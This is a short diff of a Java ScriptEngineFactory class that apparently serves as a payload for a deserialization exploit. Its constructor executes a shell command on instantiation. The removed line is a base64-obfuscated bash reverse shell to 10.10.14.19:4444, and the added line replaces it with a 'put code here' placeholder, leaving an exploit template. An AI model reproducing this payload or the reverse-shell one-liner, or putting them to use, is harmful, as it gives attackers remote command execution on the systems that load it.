@@ -9,7 +9,7 @@ public class AwesomeScriptEngineFactory implements ScriptEngineFactory {
 
     public AwesomeScriptEngineFactory() {
         try {
-            Runtime.getRuntime().exec("bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xOS80NDQ0IDA+JjE=}|{base64,-d}|{bash,-i}");
+            Runtime.getRuntime().exec("put code here/poner codigo aqui");
         } catch (IOException e) {
             e.printStackTrace();
         }
